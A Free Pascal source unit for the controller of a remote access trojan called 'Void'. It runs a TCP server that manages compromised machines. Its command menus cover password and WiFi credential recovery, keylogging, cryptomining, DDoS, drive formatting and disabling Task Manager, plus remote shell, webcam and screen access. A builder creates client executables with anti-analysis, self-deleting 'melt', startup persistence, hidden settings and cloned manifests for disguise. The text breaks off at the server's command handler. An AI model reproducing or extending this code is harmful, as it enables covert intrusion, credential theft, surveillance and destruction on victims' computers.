unit VoidUnit;

{$mode objfpc}{$H+}
{$WARN 4104 on : Implicit string type conversion from "$1" to "$2"}
interface

uses
  Windows, Classes, SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs,
  ExtCtrls, Grids, StdCtrls, Menus, ComCtrls, BCButton, BGRAFlashProgressBar,
  ScrollingText, IdTCPServer, Types, IdContext, ParamUnit, DateTimePicker,
  SynEdit, SynCompletion, SynHighlighterAny, RemoteCMDUnit, RemoteFileUnit,
  INIFiles, Base64, ScreenUnit, ChatUnit, WebcamUnit, Communication, LCLType,
  MaskEdit, Commands, ManifestUtils, AbUnzper, AppendUtils;

//TODOs
{ TODO -cStrong : Make all arrays 1-indexed }
{ TODO -cBugfix : Client disconnection when Tasks Tab is open }
{ TODO -cStrong : Make Loop a local variable! This is a multi-threaded application, you idiot. }
{ TODO -cMedium : Add the Encryption key to the settings }
{ TODO -cMedium : Enhance the File Explorer (multi-select) }
{ TODO -cStrong : Enhance download/upload speed (File Explorer) URGENT!!}
{ TODO -cStrong : Move the communication stuff to another unit }
{ TODO -cBugfix : Exit of single task when client disconnects }
{ TODO -cStrong : Get File Version Info instead of manifest.
See the bookmark I left for you. :D }
{ TODO -cStrong : Finish the Builder }
//TODOs end

const clVoid = TColor($00433201);
      clNova = TColor($00993366);
      clCurious = TColor($00DB9834);
      clDarkerVoid = TColor($00342701);

type

  TVoidConnection = record
    MainContext: TIdContext;
    IP: String;
    Name: String;
    Online: Boolean;
  end;

  TClients = Array of TVoidConnection;

  { TVoidForm }

  TVoidForm = class(TForm)
    UnZip: TAbUnZipper;
    CloneButton: TBCButton;
    ManifestDialog: TOpenDialog;
    BuildSaveDialog: TSaveDialog;
    VersionEdit: TEdit;
    PermBox: TCheckBox;
    CopyrightEdit: TEdit;
    CopyrightLabel: TLabel;
    PermLabel: TLabel;
    NameEdit: TEdit;
    MDescEdit: TEdit;
    CompanyEdit: TEdit;
    NameLabel: TLabel;
    LoadIconButton: TBCButton;
    ClearIconButton: TBCButton;
    ExeIconImage: TImage;
    IconLabel: TLabel;
    DimLabel: TLabel;
    MDescLabel: TLabel;
    CompanyLabel: TLabel;
    MVersionLabel: TLabel;
    StartupBox: TCheckBox;
    StartupLabel: TLabel;
    RegLabel: TLabel;
    FolderLabel: TLabel;
    TaskLabel: TLabel;
    RegRadio: TRadioButton;
    FolderRadio: TRadioButton;
    TaskRadio: TRadioButton;
    ExecBox: TCheckBox;
    MeltBox: TCheckBox;
    StartupPanel: TPanel;
    VolBox: TCheckBox;
    ProtectBox: TCheckBox;
    ExecLabel: TLabel;
    MeltLabel: TLabel;
    VolLabel: TLabel;
    ProtectLabel: TLabel;
    BuildButton: TBCButton;
    BOptionsBox: TGroupBox;
    AntiBox: TCheckBox;
    AntiLabel: TLabel;
    RESLabel: TLabel;
    ADSLabel: TLabel;
    EOFRadio: TRadioButton;
    EOFLabel: TLabel;
    RESRadio: TRadioButton;
    ADSRadio: TRadioButton;
    StorageLabel: TLabel;
    ManifestBox: TGroupBox;
    BTitleLabel: TLabel;
    MTitleLabel: TLabel;
    BuildStatus: TLabel;
    BuildProgress: TBGRAFlashProgressBar;
    VersionBox: TComboBox;
    CompileItem: TMenuItem;
    VersionLBL: TLabel;
    NewItem: TMenuItem;
    ScriptOpen: TOpenDialog;
    ScriptSave: TSaveDialog;
    SaveItem: TMenuItem;
    OpenItem: TMenuItem;
    CopyItem: TMenuItem;
    ScriptEdit: TSynEdit;
    SynPopup: TPopupMenu;
    ScriptEditPanel: TPanel;
    ScriptEditMenu: TLabel;
    LogPanel: TPanel;
    SynHighlight: TSynAnySyn;
    SynComplete: TSynCompletion;
    VisibleLog: TMemo;
    TheServer: TIdTCPServer;
    StatusLabel: TLabel;
    TaskProgress: TBGRAFlashProgressBar;
    BigImage: TImage;
    LogMenu: TLabel;
    AboutMenu: TLabel;
    ExplorerButton: TBCButton;
    CatButton: TBCButton;
    CommandList: TListBox;
    CatDropDown: TPopupMenu;
    DescBox: TGroupBox;
    DescLabel: TLabel;
    IconImage: TImage;
    CaptionLBL: TLabel;
    Credits: TScrollingText;
    ScrCat: TMenuItem;
    ProCat: TMenuItem;
    VersionInfo: TStaticText;
    VersionLabel: TLabel;
    CancelButton: TBCButton;
    ExecuteButton: TBCButton;
    ComDesc: TStaticText;
    SysCat: TMenuItem;
    InfCat: TMenuItem;
    AdmCat: TMenuItem;
    NetCat: TMenuItem;
    MisCat: TMenuItem;
    CatImages: TImageList;
    ScreenshareButton: TBCButton;
    WebcamButton: TBCButton;
    ChatButton: TBCButton;
    ClientGrid: TStringGrid;
    HomeMenu: TLabel;
    ClientsLabel: TLabel;
    TasksPanel: TPanel;
    BuilderPanel: TPanel;
    StatsPanel: TPanel;
    AboutPanel: TPanel;
    TileList: TImageList;
    TargetItem: TMenuItem;
    SelectItem: TMenuItem;
    OnlineItem: TMenuItem;
    OfflineItem: TMenuItem;
    AllItem: TMenuItem;
    TasksMenu: TLabel;
    MenuPanel: TPanel;
    GridMenu: TPopupMenu;
    BuilderMenu: TLabel;
    StatsMenu: TLabel;
    SettingsMenu: TLabel;
    CMDButton: TBCButton;
    procedure ADSRadioClick(Sender: TObject);
    procedure AllItemClick(Sender: TObject);
    procedure BuildButtonClick(Sender: TObject);
    procedure CloneButtonClick(Sender: TObject);
    procedure StartupBoxChange(Sender: TObject);
    procedure CancelButtonClick(Sender: TObject);
    procedure ChatButtonClick(Sender: TObject);
    procedure CMDButtonClick(Sender: TObject);
    procedure CommandListSelectionChange(Sender: TObject; {%H-}User: boolean);
    procedure CompileItemClick(Sender: TObject);
    procedure CopyItemClick(Sender: TObject);
    procedure ExecuteButtonClick(Sender: TObject);
    procedure ExplorerButtonClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure CommandListDrawItem({%H-}Control: TWinControl; Index: Integer;
      ARect: TRect; {%H-}State: TOwnerDrawState);
    procedure CommandListMeasureItem({%H-}Control: TWinControl; {%H-}Index: Integer;
      var AHeight: Integer);
    procedure FormDestroy(Sender: TObject);
    procedure NewItemClick(Sender: TObject);
    procedure OfflineItemClick(Sender: TObject);
    procedure OnlineItemClick(Sender: TObject);
    procedure OpenItemClick(Sender: TObject);
    procedure SaveItemClick(Sender: TObject);
    procedure ScreenshareButtonClick(Sender: TObject);
    procedure SideMenuMouseUp(Sender: TObject; {%H-}Button: TMouseButton;
      {%H-}Shift: TShiftState; {%H-}X, {%H-}Y: Integer);
    procedure SideMenuClick(Sender: TObject);
    procedure SideMenuMouseDown(Sender: TObject; {%H-}Button: TMouseButton;
      {%H-}Shift: TShiftState; {%H-}X, {%H-}Y: Integer);
    procedure SideMenuMouseEnter(Sender: TObject);
    procedure SideMenuMouseLeave(Sender: TObject);
    procedure SysCatClick(Sender: TObject);
    procedure TargetItemClick(Sender: TObject);
    procedure TheServerConnect(AContext: TIdContext);
    procedure TheServerDisconnect(AContext: TIdContext);
    procedure TheServerExecute(AContext: TIdContext);
    procedure WebcamButtonClick(Sender: TObject);
  private

  public
    procedure SetCommandDescription(Num: LongInt);
    procedure SetTaskButtons(aEnabled: Boolean);
    procedure ErrorHandle(Sender: TObject; E: Exception);
  end;

const
  TVC_COMPLETE = 1;
  TVC_DESC = 2;
  TVC_ALERTLEVEL = 3;
  TVC_PARAMS = 4;
  NotClient = 'System';
  ExceptionFile = 'Errors.txt';

var
  VoidForm: TVoidForm;
  Targets: TClients;
  CNum: LongInt;
  Clients: TClients;
  SingleTaskActive: Boolean = false;
  DB: TINIFile;
  ExecAllowed: Boolean = true;
  CurrentScript: String = '';

implementation

{$R *.lfm}

{ TVoidForm }

function GetTitleOfActiveWindow: string;
var
  AHandle: THandle;
  ATitle: string;
  ALen: Integer;
begin
  Result := '';
  AHandle := GetForegroundWindow;

  if AHandle <> 0 then begin
    ALen := GetWindowTextLength(AHandle) + 1;
    SetLength(ATitle, ALen);
    GetWindowText(AHandle, PChar(ATitle), ALen);
    result := Trim(ATitle);
  end;
end;

procedure TVoidForm.ErrorHandle(Sender: TObject; E: Exception);
var FFile: Text;
Begin
  AssignFile(FFile,ExceptionFile);
  if FileExists(ExceptionFile) then Append(FFile) else Rewrite(FFile);
  Writeln(FFile,'Active Window: '+GetTitleOfActiveWindow);
  Writeln(FFile,'Exeption Class Name: '+E.ClassName);
  Writeln(FFile,'Exeption Unit Name: '+E.UnitName);
  Writeln(FFile,'Exeption As String: '+E.ToString);
  Writeln(FFile,'Exeption: '+E.Message);
  Writeln(FFile,'================================');
  CloseFile(FFile);
End;

procedure DoBuildStatus(StrToStatus: String);
Begin
  VoidForm.BuildStatus.Caption:=StrToStatus;
end;

procedure Log(StrToLog: String);
Begin
 VoidForm.VisibleLog.Lines.Add(StrToLog);
end;

procedure TVoidForm.SetTaskButtons(aEnabled: Boolean);
Begin
 ExplorerButton.Enabled:=aEnabled;
 ScreenShareButton.Enabled:=aEnabled;
 WebcamButton.Enabled:=aEnabled;
 ChatButton.Enabled:=aEnabled;
 CMDButton.Enabled:=aEnabled;
end;

procedure SwitchTab(aName: String);
Begin
  With VoidForm do Begin
   ClientGrid.Selection:=Rect(-1,-1,-1,-1);
   if aName='Home' then ClientGrid.Visible:=True else ClientGrid.Visible:=False;
   if aName='Tasks' then Begin
   if High(Targets)=1 then Begin
    ClientsLabel.Caption:=Targets[1].Name+' ('+Targets[1].IP+') is selected.';
    if Not(SingleTaskActive) then
    SetTaskButtons(True);
   end
   else if High(Targets)>1 then Begin
    ClientsLabel.Caption:=IntToStr(High(Targets))+' clients selected.';
    SetTaskButtons(False);
   end else Begin
    ClientsLabel.Caption:='No clients selected.';
    SetTaskButtons(False);
   end;
   TasksPanel.Visible:=True;
   end else Begin
    TasksPanel.Visible:=False;
    ClientsLabel.Caption:='No clients selected.';
   end;
   if aName='Builder' then BuilderPanel.Visible:=True else BuilderPanel.Visible:=False;
   if aName='Statistics' then StatsPanel.Visible:=True else StatsPanel.Visible:=False;
   if aName='About' then Begin
     AboutPanel.Visible:=True;
     Credits.Active:=True;
     end else Begin
      AboutPanel.Visible:=False;
      Credits.Active:=False;
     end;
   if aName='Log' then LogPanel.Visible:=True else LogPanel.Visible:=False;
   if aName='Script Editor' then ScriptEditPanel.Visible:=True else ScriptEditPanel.Visible:=False;
  end;
end;

function FindConnectionByNum(Num: LongInt): TVoidConnection;
var P: LongInt;
Begin
 Result.Name:='Not found';
 For P:=Low(Clients) to High(Clients) do
 if (Clients[P].Name=VoidForm.ClientGrid.Cells[0,Num]) and
 (Clients[P].IP=VoidForm.ClientGrid.Cells[1,Num]) then
 Begin
  Result:=Clients[P];
  Break;
 end;
End;

procedure PrepareCommands(aName: String);
Begin
  With VoidForm do Begin
   Case aName of
   'SysCat': CommandList.Items.CommaText:='Shutdown,"Shutdown with Message",Reboot,"Turn Monitor OFF","Turn Monitor ON"';
   'NetCat': CommandList.Items.CommaText:='"Get Network Information","Get WiFi Networks","Recover WiFi Profiles"';
   'ProCat': CommandList.Items.CommaText:='"Get Running Processes","Check if a Process Exists","Kill Process","Disable Task Manager","Enable Task Manager"';
   'InfCat': CommandList.Items.CommaText:='"Get System Information","Get Installed Programs","Recover Saved Passwords"';
   'AdmCat': CommandList.Items.CommaText:='"Download File","Upload File","Run Executable","Run Command","Update Client","Restart Client","Uninstall Client","Ignore Client","Format Drive"';
   'ScrCat': CommandList.Items.CommaText:='"Execute Script","Schedule Script","Execute JavaScript","Execute VBScript","Halt All Scripts"';
   'MisCat': CommandList.Items.CommaText:='"Start Mining","Stop Mining","Start DDoS","Stop DDoS","Start Keylogger","Stop Keylogger","Open Webpage","Change Volume","Play Sound","Beep","Print","Open File","Messagebox"';
   end;
  end;
end;

procedure AddEntry(Client, IP, Location, Version, Status: String);
var I: LongInt;
Begin
  With VoidForm.ClientGrid do Begin
   RowCount:=RowCount+1;
   Cells[0,RowCount-1]:=Client;
   Cells[1,RowCount-1]:=IP;
   Cells[2,RowCount-1]:=Location;
   Cells[3,RowCount-1]:=Version;
   Cells[4,RowCount-1]:=Status;
   I:=RowCount*(DefaultRowHeight);
   //ShowMessage(IntToStr(I));
   //ShowMessage(IntToStr(Height));
   if Height>I then Height:=I else
   if I<=VoidForm.Height then Height:=I
   else Height:=VoidForm.Height;
   //ShowMessage(IntToStr(Height));
  end;
end;

procedure TVoidForm.SetCommandDescription(Num: LongInt);
Begin
 ComDesc.Caption:=FindCommandByNum(Num).Desc;
end;

procedure TVoidForm.FormActivate(Sender: TObject);
begin

end;

procedure TVoidForm.AllItemClick(Sender: TObject);
var I: LongInt;
begin
 if ClientGrid.RowCount>1 then Begin
 SetLength(Targets,1);
 For I:=1 to ClientGrid.RowCount-1 do Begin
   SetLength(Targets, High(Targets) + 2);
   Targets[High(Targets)]:=FindConnectionByNum(I);
 end;
 end;
end;

procedure TVoidForm.ADSRadioClick(Sender: TObject);
begin
  ShowMessage('This option is experimental. Do not use it, unless absolutely necessary.');
end;

function GetBuildSettings: String;
Begin
 With VoidForm do Begin
 Result:='';
 Result+=BoolToStr(AntiBox.Checked, '1', '0');
 Result+=BoolToStr(ExecBox.Checked, '1', '0');
 Result+=BoolToStr(MeltBox.Checked, '1', '0');
 Result+=BoolToStr(VolBox.Checked, '1', '0');
 Result+=BoolToStr(ProtectBox.Checked, '1', '0');
 Result+=BoolToStr(StartupBox.Checked, '1', '0');
 if RegRadio.Checked then Result+='1' else
 if FolderRadio.Checked then Result+='2' else
 if TaskRadio.Checked then Result+='3';
 end;
end;

procedure TVoidForm.BuildButtonClick(Sender: TObject);
var VOpt: String;
begin
 if BuildSaveDialog.Execute then Begin
  if FileExists('VoidClient.exe') then DeleteFile('VoidClient.exe');
  //Extract resources
  DoBuildStatus('Extracting resources...');
  if VersionBox.ItemIndex = 0 then Begin
   UnZip.FileName:='build\VoidClient.zip';
   UnZip.Password:=DecryptStr('47DCB16358B372DF53E8',333);   //Min
  end
  else Begin
   UnZip.FileName:='build\VoidClientMin.zip';
   if Not(FileExists(UnZip.FileName)) then Begin
    ShowMessage('The minimal module is not available.');
    Exit;
   End;
   UnZip.Password:=DecryptStr('4CF198F2135ADA189E1205',333);  //Full
  end;
  UnZip.ExtractFiles('*.exe');
  UnZip.CloseArchive;
  DoBuildStatus('Assembling settings...');
  //Compile settings
  VOpt:=GetBuildSettings;
  DoBuildStatus('Adding settings...');
  //Update settings
  if EOFRadio.Checked then Begin
     WriteEOF('VoidClient.exe',VOpt,'VOPT','VEND');
  End else if RESRadio.Checked then Begin
     AlterResource('VoidClient.exe','VOPT',StringToBytes(VOpt));
  end else Begin
     WriteADS('VoidClient.exe','VOPT',VOpt);
  End;
  //Update manifest and info
  //Finalize
  CopyFile('VoidClient.exe',BuildSaveDialog.FileName);
  DeleteFile('VoidClient.exe');
  DoBuildStatus('Idle');
 end;
end;

procedure TVoidForm.CloneButtonClick(Sender: TObject);
begin
  if ManifestDialog.Execute then Begin
   GetManifest(ManifestDialog.FileName);
   NameEdit.Text:=ExtractProperty('name');
   MDescEdit.Text:=ExtractProperty('description', True);
   CompanyEdit.Text:='';
   VersionEdit.Text:=ExtractProperty('version');
   CopyrightEdit.Text:='';
   ShowMessage('Manifest cloned successfully.');
  end;
end;

procedure TVoidForm.StartupBoxChange(Sender: TObject);
begin
 if StartupBox.Checked then StartupPanel.Enabled:=True
 else StartupPanel.Enabled:=False;
end;

procedure TVoidForm.CancelButtonClick(Sender: TObject);
begin
 ExecAllowed:=False;
end;

procedure TVoidForm.ChatButtonClick(Sender: TObject);
var MyName, OtherName: String;
begin
 if InputQuery('Remote Chat', 'Please enter your name:', MyName) then
 if InputQuery('Remote Chat', 'Please enter a name for the Client:', OtherName) then Begin
  SingleTaskActive:=True;
  SetTaskButtons(False);
  SendEncrypt(Targets[1].MainContext,555,OtherName);
  ChatUnit.MyName:=MyName;
  ChatForm.ChatLog.Lines.Clear;
  ChatForm.Show;
 end;
end;

procedure TVoidForm.CMDButtonClick(Sender: TObject);
begin
 RemoteCMDForm.Console.Clear;
 RemoteCMDForm.Show;
 SendEmptyCommand(Targets[1].MainContext, 777);
end;

procedure TVoidForm.CommandListSelectionChange(Sender: TObject; User: boolean);
//CNUM FORMAT
//ItemIndex+1|CategoryIndex
//This Setup => Max. Categories = 9
begin
  CNum:=(CommandList.ItemIndex+1)*10+CatDropDown.Items.IndexOf(CatDropDown.Items.Find(CatButton.Caption));
  SetCommandDescription(CNum);
  //CancelButton.Caption:='Ignore: '+IntToStr(CNum);
end;

procedure TVoidForm.CompileItemClick(Sender: TObject);
begin
  ShowMessage(CompileScript(ScriptEdit.Lines, ExtractFilePath(CurrentScript)+'Compiled_'+ExtractFileName(CurrentScript)));
end;

procedure TVoidForm.CopyItemClick(Sender: TObject);
begin
  ScriptEdit.CopyToClipboard;
end;

procedure FinalExecuteCommand(Con: TVoidConnection; TheCmd: TVoidCommand; aParams: String);
Begin
  if Con.Name<>'Not found' then Begin
   if Not(SendEncrypt(Con.MainContext, TheCmd.Number, aParams, False)) then
   Log('Client not online: '+Con.Name) else
   Log('Command sent successfully: '+IntToStr(TheCmd.Number)+'@'+aParams);
  end;
end;

procedure TVoidForm.ExecuteButtonClick(Sender: TObject);
var Labs: Array of TLabel; //Labels
    Imps: Array of TControl; //Inputs
    Params, LabCap, ImpType: String;
    Current: TVoidCommand;
    TotalParams, P, aTop, AllImps, Loop: LongInt;
    NumOnly: Boolean = false;
label EDT;
begin
  //Dynamic Input Genereration for Commands with Parameters
  if CNum>0 then Begin
   ExecAllowed:=True;
   TaskProgress.MaxValue:=High(Targets);
   Current:=FindCommandByNum(CNum);
   Params:=Current.ParamRequest;
   TotalParams:=StrToInt(LeftStr(Params,Pos('@',Params)-1));
   if TotalParams > 0 then Begin
    aTop:=55;
    AllImps:=0;
    Delete(Params,1,Pos('@',Params));
    For P:=1 to TotalParams do Begin
     SetLength(Labs, P+1);
     LabCap:=LeftStr(Params,Pos('|',Params)-1);
     Delete(Params,1,Pos('|',Params));
     ImpType:=LeftStr(Params,Pos('#',Params)-1);
     Delete(Params,1,Pos('#',Params));
     Labs[P]:=TLabel.Create(Self);
     Labs[P].Parent:=ParamForm;
     Labs[P].Top:=aTop;
     Labs[P].Caption:=LabCap+':';
     Labs[P].AnchorToNeighbour(akRight, 5, ParamForm.CenterMarker);
     (Labs[P] as TLabel).Alignment:=taRightJustify;
     Case ImpType of
      'Big': Begin
       Inc(AllImps);
       SetLength(Imps, AllImps + 1);
       Imps[AllImps]:=TMemo.Create(Self);
       Imps[AllImps].Parent:=ParamForm;
       Imps[AllImps].Top:=aTop;
       Imps[AllImps].Height:=100;
       Imps[AllImps].Font.Color:=clBlack;
       Imps[AllImps].Width:=ParamForm.Width-(ParamForm.CenterMarker.Left+20);
       Imps[AllImps].AnchorToNeighbour(akLeft, 5, ParamForm.CenterMarker);
       aTop += Imps[AllImps].Height+5;
      end;
      'Edit': Begin
EDT:
       Inc(AllImps);
       SetLength(Imps, AllImps + 1);
       Imps[AllImps]:=TEdit.Create(Self);
       (Imps[AllImps] as TEdit).NumbersOnly:=NumOnly;
       Imps[AllImps].Parent:=ParamForm;
       Imps[AllImps].Top:=aTop;
       Imps[AllImps].Font.Color:=clBlack;
       Imps[AllImps].Width:=ParamForm.Width-(ParamForm.CenterMarker.Left+20);
       Imps[AllImps].AnchorToNeighbour(akLeft, 5, ParamForm.CenterMarker);
       aTop += Imps[AllImps].Height+5;
     end;
      'DatePicker': Begin
       Inc(AllImps);
       SetLength(Imps, AllImps + 1);
       Imps[AllImps]:=TDateTimePicker.Create(Self);
       Imps[AllImps].Parent:=ParamForm;
       Imps[AllImps].Top:=aTop;
       Imps[AllImps].Font.Color:=clBlack;
       (Imps[AllImps] as TDateTimePicker).Kind:=dtkDate;
       Imps[AllImps].AnchorToNeighbour(akLeft, 5, ParamForm.CenterMarker);
       Inc(AllImps);
       SetLength(Imps, AllImps + 1);
       Imps[AllImps]:=TDateTimePicker.Create(Self);
       Imps[AllImps].Parent:=ParamForm;
       Imps[AllImps].Top:=aTop;
       Imps[AllImps].Font.Color:=clBlack;
       (Imps[AllImps] as TDateTimePicker).Kind:=dtkTime;
       Imps[AllImps].AnchorToNeighbour(akLeft, 2, Imps[AllImps-1]);
       aTop += Imps[AllImps].Height+5;
     end;
      'Radio': Begin
       Inc(AllImps);
       SetLength(Imps, AllImps + 1);
       Imps[AllImps]:=TRadioButton.Create(Self);
       Imps[AllImps].Parent:=ParamForm;
       Imps[AllImps].Top:=aTop;
       Imps[AllImps].AnchorToNeighbour(akLeft, 5, ParamForm.CenterMarker);
       aTop += Labs[P].Height+5;
     end;
      'Number': Begin
       NumOnly:=True;
       Goto EDT;
     end;
      'Caption': Begin
       Labs[P].Caption:=LeftStr(Labs[P].Caption,Length(Labs[P].Caption)-1);
     end;
    end;
    end;
    ParamForm.ExecuteButton.Top:=aTop+10;
    ParamForm.Height:=aTop+10+ParamForm.ExecuteButton.Height+10;
    ParamForm.ShowModal;
    Repeat
      Application.ProcessMessages;
    until Not(ParamForm.Visible);
     Params:='';
     For P:=1 to TotalParams do Labs[P].Free;
     For P:=1 to AllImps do Begin
      if (Imps[P] is TMemo) then
      Params += (Imps[P] as TMemo).Lines.Text + '#'
      else if (Imps[P] is TEdit) then
      Params += (Imps[P] as TEdit).Text + '#'
      else if (Imps[P] is TRadioButton) then
      Params += BoolToStr((Imps[P] as TRadioButton).Checked,'True','False') + '#'
      else if (Imps[P] is TDateTimePicker) then Begin
      if (Imps[P] as TDateTimePicker).Kind = dtkDate then
      Params += FormatDateTime('mm/dd/yyyy', (Imps[P] as TDateTimePicker).Date) + '#'
      else Params += FormatDateTime('hh:mm:ss', (Imps[P] as TDateTimePicker).Time) + '#'
      end;
      Imps[P].Free;
     end;
     if ParamUnit.ExitType = 0 then Begin
      Params:=StringReplace(Params, sLineBreak, '\n', [rfReplaceAll, rfIgnoreCase]);
      For Loop:=1 to High(Targets) do Begin
       Application.ProcessMessages;
       if ExecAllowed then Begin
        StatusLabel.Caption:='Sending command '+IntToStr(Loop)+' of '+IntToStr(High(Targets));
        FinalExecuteCommand(Targets[Loop], Current, Params);
        TaskProgress.Value:=TaskProgress.Value+1;
       end else Begin
        ShowMessage('Execution aborted. Command already sent to '+IntToStr(Loop-1)+' of '+IntToStr(High(Targets))+' clients.');
        Break;
       End;
      end;
     End;
   end else Begin
    For Loop:=1 to High(Targets) do Begin
       Application.ProcessMessages;
       if ExecAllowed then Begin
        StatusLabel.Caption:='Sending command '+IntToStr(Loop)+' of '+IntToStr(High(Targets));
        FinalExecuteCommand(Targets[Loop], Current, '');
        TaskProgress.Value:=TaskProgress.Value+1;
       end else Begin
        ShowMessage('Execution aborted. Command already sent to '+IntToStr(Loop)+' of '+IntToStr(High(Targets))+' clients.');
        Break;
       End;
    end;
   end;
  end else ShowMessage('Please select a command first.');
  TaskProgress.Value:=0;
  StatusLabel.Caption:='Idle';
end;

procedure TVoidForm.ExplorerButtonClick(Sender: TObject);
begin
  DriveCount:=0;
  CName:=Targets[1].Name;
  FileForm.DirView.Items.Clear;
  FileForm.Show;
  SendEmptyCommand(Targets[1].MainContext, 222);
end;

procedure TVoidForm.FormCreate(Sender: TObject);
var I: LongInt;
    AList: TStringList;
begin
 if FileExists(ExceptionFile) then DeleteFile(ExceptionFile);
 For I:=0 to ClientGrid.ColCount-1 do
 ClientGrid.Cells[I,0]:=ClientGrid.Columns.Items[I].Title.Caption;
 ClientGrid.SelectedColor:=clDarkerVoid;
 SysCatClick(SysCat);
 DB:=TIniFile.Create('Database.ini');
 AList:=TStringList.Create;
 DB.ReadSections(AList);
 For I:=0 to AList.Count-1 do Begin
  if Pos(AList.Strings[I],NotClient)=0 then Begin
   With ClientGrid do begin
     RowCount:=RowCount+1;
     Cells[0,RowCount-1]:=AList.Strings[I];
     Cells[1,RowCount-1]:=DB.ReadString(AList.Strings[I],'IP','127.0.0.1');
     Cells[2,RowCount-1]:=DB.ReadString(AList.Strings[I],'Location','Unknown');
     Cells[3,RowCount-1]:=DB.ReadString(AList.Strings[I],'Version','0.003');
     Cells[4,RowCount-1]:='Offline';
    end;
  End;
 end;
 AList.Clear;
 InitCommands;
 AList:=GetAllCommandNames;
 AList.Add('CustomCommand');
 SynComplete.ItemList:=AList;
 SynHighlight.KeyWords:=AList;
 AList.Free;
end;

procedure TVoidForm.CommandListDrawItem(Control: TWinControl; Index: Integer;
  ARect: TRect; State: TOwnerDrawState);
var
  CenterText : integer;
begin
 CommandList.Canvas.FillRect (arect);
 CNum:=(Index+1)*10+CatDropDown.Items.IndexOf(CatDropDown.Items.Find(CatButton.Caption));
 CatImages.Draw(CommandList.Canvas,arect.Left + 4, arect.Top + 4, 10-FindCommandByNum(CNum).AlertLevel);
 CenterText := ( arect.Bottom - arect.Top - CommandList.Canvas.TextHeight(text)) div 2 ;
 CommandList.Canvas.Font:=CommandList.Font;
 CommandList.Canvas.TextOut (arect.left + CatImages.Width + 8 , arect.Top + CenterText,
 CommandList.Items.Strings[index]);
 if CommandList.ItemIndex>-1 then
 CommandListSelectionChange(Nil, False) else CNum:=0;
end;

procedure TVoidForm.CommandListMeasureItem(Control: TWinControl; Index: Integer;
  var AHeight: Integer);
begin
  Aheight := CatImages.Height + 4;
end;

procedure TVoidForm.FormDestroy(Sender: TObject);
begin
  DB.Free;
end;

procedure TVoidForm.NewItemClick(Sender: TObject);
begin
  ScriptEdit.Lines.Clear;
  CurrentScript:='';
end;

procedure TVoidForm.OfflineItemClick(Sender: TObject);
var I: LongInt;
begin
 if ClientGrid.RowCount>1 then Begin
 SetLength(Targets,1);
 For I:=1 to ClientGrid.RowCount-1 do
 if ClientGrid.Cells[4,I]='Offline' then Begin
   SetLength(Targets, High(Targets) + 2);
   Targets[High(Targets)]:=FindConnectionByNum(I);
 end;
 end;
end;

procedure TVoidForm.OnlineItemClick(Sender: TObject);
var I: LongInt;
begin
 if ClientGrid.RowCount>1 then Begin
 SetLength(Targets,1);
 For I:=1 to ClientGrid.RowCount-1 do
 if ClientGrid.Cells[4,I]='Online' then Begin
   SetLength(Targets, High(Targets) + 2);
   Targets[High(Targets)]:=FindConnectionByNum(I);
 end;
 end;
end;

procedure TVoidForm.OpenItemClick(Sender: TObject);
var FFile: Text;
    V: String;
begin
  if ScriptOpen.Execute then Begin
   CurrentScript:=ScriptOpen.FileName;
   AssignFile(FFile, CurrentScript);
   Reset(FFile);
   ScriptEdit.Lines.Clear;
   Repeat
    Readln(FFile, V);
    ScriptEdit.Lines.Add(V);
   until EOF(FFile);
   CloseFile(FFile);
  end;
end;

procedure TVoidForm.SaveItemClick(Sender: TObject);
var FFile: Text;
begin
  if CurrentScript = '' then Begin
   if ScriptSave.Execute then Begin
    CurrentScript:=ScriptSave.FileName;
    AssignFile(FFile, CurrentScript);
    Rewrite(FFile);
    Write(FFile, ScriptEdit.Text);
    CloseFile(FFile);
    ScriptEdit.Lines.Text:=ScriptEdit.Lines.Text;
   end;
  end else Begin
    AssignFile(FFile, CurrentScript);
    Rewrite(FFile);
    Write(FFile, ScriptEdit.Text);
    CloseFile(FFile);
    ScriptEdit.Lines.Text:=ScriptEdit.Lines.Text;
  end;
end;

procedure TVoidForm.ScreenshareButtonClick(Sender: TObject);
begin
  SingleTaskActive:=True;
  SetTaskButtons(False);
  ScreenForm.Show;
  SendEmptyCommand(Targets[1].MainContext, 333);
end;

procedure TVoidForm.SideMenuMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 (Sender as TLabel).Color:=clVoid;
end;

procedure TVoidForm.SideMenuClick(Sender: TObject);
begin
 SwitchTab((Sender as TLabel).Caption);
end;

procedure TVoidForm.SideMenuMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 (Sender as TLabel).Color:=clCurious;
end;

procedure TVoidForm.SideMenuMouseEnter(Sender: TObject);
begin
 (Sender as TLabel).Color:=clDarkerVoid;
end;

procedure TVoidForm.SideMenuMouseLeave(Sender: TObject);
begin
 (Sender as TLabel).Color:=clVoid;
end;


procedure TVoidForm.SysCatClick(Sender: TObject);
var Z: TMenuItem;
begin
 ComDesc.Caption:='Please select a command first.';
 Z:=(Sender as TMenuItem);
 CatButton.Caption:=Z.Caption;
 CatButton.Glyph:=Z.Bitmap;
 PrepareCommands(Z.Name);
 CNum:=0;
end;

procedure TVoidForm.TargetItemClick(Sender: TObject);
begin
  SetLength(Targets, 2);
  Targets[1]:=FindConnectionByNum(ClientGrid.Selection.Top);
end;

procedure TVoidForm.TheServerConnect(AContext: TIdContext);
begin
  Log('Connection from: '+AContext.Binding.PeerIP);
end;

procedure TVoidForm.TheServerDisconnect(AContext: TIdContext);
var P, Loop: LongInt;
begin
 For Loop:=1 to High(Targets) do
 if Targets[Loop].MainContext = AContext then Begin
  For P:=Loop to High(Targets)-1 do
  Targets[P]:=Targets[P+1];
  SetLength(Targets, High(Targets));
  Sleep(100);
  if TasksPanel.Visible then SwitchTab('Tasks');
 end;
 For Loop:=Low(Clients) to High(Clients) do
 if Clients[Loop].MainContext = AContext then Begin
 For P:=1 to ClientGrid.RowCount-1 do
  if (ClientGrid.Cells[0, P]=Clients[Loop].Name) and (ClientGrid.Cells[1, P]=Clients[Loop].IP) then
  ClientGrid.Cells[4, P]:='Offline';
  For P:=Loop to High(Clients)-1 do
  Clients[P]:=Clients[P+1];
  SetLength(Clients, High(Clients));
  Log(AContext.Binding.PeerIP+' disconnected.');
 end;

end;

procedure TVoidForm.TheServerExecute(AContext: TIdContext);
var Com: String;
    H, INum, P, J: LongInt;
    FFile: Text;
    Jay: TJPEGImage;
    S: TMemoryStream;
begin
